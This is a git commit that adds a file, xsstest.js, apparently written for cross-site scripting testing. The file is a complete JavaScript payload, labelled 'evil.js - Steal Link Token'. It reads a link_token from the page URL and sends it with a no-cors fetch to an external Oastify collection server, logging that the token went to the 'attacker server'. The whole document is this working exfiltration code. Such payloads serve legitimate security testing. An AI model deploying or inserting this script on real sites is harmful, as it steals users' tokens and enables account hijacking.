4f47603af06f31a3edab05feec6deb3f6dac03ec
sonahri6643-collab <sonahri6643@gmail.com>
2026-07-08 13:09:28 +0500

    Create xsstest.js

---
+++ xsstest.js
@@ -0,0 +1,16 @@
+// evil.js - Steal Link Token
+(function() {
+    // Extract link_token from URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const linkToken = urlParams.get('link_token');
+
+    if (linkToken) {
+        // Send the token to the attacker's Oastify server
+        fetch('https://betutt5vyf64cny1mq6w5yei69c00qof.oastify.com/steal?token=' + encodeURIComponent(linkToken), {
+            mode: 'no-cors' // Using no-cors bypasses cross-origin issues, even though we don't see the response
+        });
+        console.log('[!] Link Token sent to attacker server');
+    } else {
+        console.log('[!] No link_token found');
+    }
+})();
